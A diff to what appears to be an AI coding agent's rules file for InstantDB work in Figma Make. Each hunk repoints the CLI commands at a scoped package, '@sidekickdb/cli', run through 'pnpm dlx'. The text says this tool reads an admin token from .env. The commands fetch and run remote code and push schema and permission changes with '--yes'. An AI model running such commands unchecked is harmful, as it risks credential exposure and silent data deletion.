@@ -3,7 +3,7 @@ Act as a world-class senior frontend engineer with deep expertise in InstantDB a
 # Additional rules for Figma Make
 
 - In your app code, hardcode the app id (don't read it from `process.env` in the bundle).
-- But DO create a `.env` with `VITE_INSTANT_APP_ID=...` and `INSTANT_ADMIN_TOKEN=...`. The `sidekick-cli` reads these, so `pnpm dlx sidekick-cli` works without logging in.
+- But DO create a `.env` with `VITE_INSTANT_APP_ID=...` and `INSTANT_ADMIN_TOKEN=...`. The `sidekick-cli` reads these, so `pnpm dlx --package=@sidekickdb/cli sidekick-cli` works without logging in.
 
 # About InstantDB aka Instant
 
@@ -30,7 +30,7 @@ Create your `.env` file with the credentials from this document.
 If you have an app id/admin token but no schema/perm files, pull them:
 
 ```bash
-pnpm dlx sidekick-cli pull --yes
+pnpm dlx --package=@sidekickdb/cli sidekick-cli pull --yes
 ```
 
 ## Schema changes
@@ -38,7 +38,7 @@ pnpm dlx sidekick-cli pull --yes
 Edit `instant.schema.ts`, then push:
 
 ```bash
-pnpm dlx sidekick-cli push schema --yes
+pnpm dlx --package=@sidekickdb/cli sidekick-cli push schema --yes
 ```
 
 New fields = additions; missing fields = deletions.
@@ -46,7 +46,7 @@ New fields = additions; missing fields = deletions.
 To rename fields:
 
 ```bash
-pnpm dlx sidekick-cli push schema --rename 'posts.author:posts.creator stores.owner:stores.manager' --yes
+pnpm dlx --package=@sidekickdb/cli sidekick-cli push schema --rename 'posts.author:posts.creator stores.owner:stores.manager' --yes
 ```
 
 ## Permission changes
@@ -54,7 +54,7 @@ pnpm dlx sidekick-cli push schema --rename 'posts.author:posts.creator stores.ow
 Edit `instant.perms.ts`, then push:
 
 ```bash
-pnpm dlx sidekick-cli push perms --yes
+pnpm dlx --package=@sidekickdb/cli sidekick-cli push perms --yes
 ```
 
 # CRITICAL Query Guidelines
@@ -379,7 +379,7 @@ if (created) {
 
 # Ad-hoc queries from the CLI
 
-Run `pnpm dlx sidekick-cli query '{ posts: {} }' --admin` to query your app. A context flag is required: `--admin`, `--as-email <email>`, or `--as-guest`. Also supports `--app <id>`.
+Run `pnpm dlx --package=@sidekickdb/cli sidekick-cli query '{ posts: {} }' --admin` to query your app. A context flag is required: `--admin`, `--as-email <email>`, or `--as-guest`. Also supports `--app <id>`.
 
 # Instant Documentation
 
